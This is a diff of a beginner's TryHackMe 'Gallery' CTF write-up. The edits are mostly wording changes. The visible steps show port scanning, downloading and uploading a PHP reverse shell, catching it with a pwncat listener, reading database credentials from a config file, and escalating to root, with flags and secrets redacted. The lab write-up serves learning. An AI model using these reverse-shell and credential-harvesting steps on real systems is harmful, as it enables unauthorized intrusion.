@@ -4,14 +4,15 @@ This is my first writeup, so if there are any misleading information or mistakes
 In this TryHackMe room, [Gallery](https://tryhackme.com/room/gallery666) difficulty is rated at Easy, which wonderful for beginners like me! Lol
 
 What you will learn:
---* Basic SQL Injection.
---* Linux Privilege Escalation.
+
+⋅⋅* Basic SQL Injection.
+⋅⋅* Linux Privilege Escalation.
 
 # Background
 > Our gallery is not very well secured.
 
 # Reconnaissance
-As usual, scan the target via `rustscan`.
+As usual, scan the machine via `rustscan`.
 ```
 ┌──(root💀nam)-[~/thm/ctf/Gallery/writeups]
 └─# rustscan --ulimit 5000 -t 2000 --range 1-65535 -a $IP -- -sC -sV -oN scanning/rustscan.txt
@@ -107,7 +108,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 19.66 seconds
            Raw packets sent: 6 (240B) | Rcvd: 3 (128B)
 ```
-According to the above scan, I've found `2` open ports: `80` and `8080`.
+According to the above scanning, I've found `2` open ports: `80` and `8080`.
 
 Port 80 is a default Apache home page.
 ![default Apache home page](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Gallery/80.png)
@@ -128,7 +129,7 @@ Let's click on browse, and upload a `php reverse shell`. I'll use a php reverse 
 └─# wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
 ```
 Modify your listener IP address and port.
-Setup a listener, I'll use [`pwncat`](https://github.com/calebstewart/pwncat) to upgrade and stable the reverse shell automatically.(P.S Hit `Ctrl+D` to switch between remote and local)
+Setup a listener, I'll use [`pwncat`](https://github.com/calebstewart/pwncat) to upgrade and stable the reverse shell automatically.(Tips. Hit `Ctrl+D` to switch between remote and local)
 ```
 ┌──(root💀nam)-[~/thm/ctf/Gallery]
 └─# pwncat-cs -l 10.2.119.204 4444                                                                     
@@ -142,7 +143,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
 # Privilege Escalation
-After having the reverse shell, I started to exploring the target's home directory.
+After having the reverse shell, I started to exploring this machine's home directory.
 I found a user flag at `/home/mike`
 ```
 (remote) www-data@gallery:/home/mike$ ls -la
@@ -165,20 +166,20 @@ Then, I discovered a initialize.php file at `/var/www/html/gallery`, which conta
 ```
 (remote) www-data@gallery:/var/www/html/gallery$ cat initialize.php 
 <?php
-$dev_data = array('id'=>'-1','firstname'=>'`redacted`','lastname'=>'','username'=>'`redacted`','password'=>'`redacted`','last_login'=>'','date_updated'=>'','date_added'=>'');
+$dev_data = array('id'=>'-1','firstname'=>'---redacted---','lastname'=>'','username'=>'---redacted---','password'=>'---redacted---','last_login'=>'','date_updated'=>'','date_added'=>'');
 
 if(!defined('base_url')) define('base_url',"http://" . $_SERVER['SERVER_ADDR'] . "/gallery/");
 if(!defined('base_app')) define('base_app', str_replace('\\','/',__DIR__).'/' );
 if(!defined('dev_data')) define('dev_data',$dev_data);
 if(!defined('DB_SERVER')) define('DB_SERVER',"localhost");
-if(!defined('DB_USERNAME')) define('DB_USERNAME',"`redacted`");
-if(!defined('DB_PASSWORD')) define('DB_PASSWORD',"`redacted`");
+if(!defined('DB_USERNAME')) define('DB_USERNAME',"---redacted---");
+if(!defined('DB_PASSWORD')) define('DB_PASSWORD',"---redacted---");
 if(!defined('DB_NAME')) define('DB_NAME',"gallery_db");
 ?>
 ``` 
 Using that credential to login into MySQL.
 ```
-(remote) www-data@gallery:/var/www/html/gallery$ mysql -u `redacted` -p gallery_db
+(remote) www-data@gallery:/var/www/html/gallery$ mysql -u [redacted] -p gallery_db
 Enter password: 
 Reading table information for completion of table and column names
 You can turn off this feature to get a quicker startup with -A
@@ -255,7 +256,7 @@ drwxr-xr-x 2 root root 4096 May 24  2021 documents
 drwxr-xr-x 2 root root 4096 May 24  2021 images
 ```
 Inside the documents directory, I found some credentials of mike?? Oh, it's useless for Privilege Escalation. Let's go back.
-Then, I found the .bash_history is weird, since it's readable for us.
+Then, I found the `.bash_history` is weird, since it's readable for us.
 ```
 (remote) www-data@gallery:/var/backups/mike_home_backup$ cat .bash_history 
 cd ~
@@ -282,7 +283,7 @@ mike@gallery:~$
 Now we can cat the user flag!
 ```
 mike@gallery:~$ cat user.txt
-`redacted`
+---redacted---
 ```
 
 > Escalate to the root user
@@ -332,7 +333,7 @@ Oh! I'm root now:D
 Let's cat the root flag out and done!
 ```
 # cat /root/root.txt
-`redacted`
+---redacted---
 ```
 
 # Conclusion
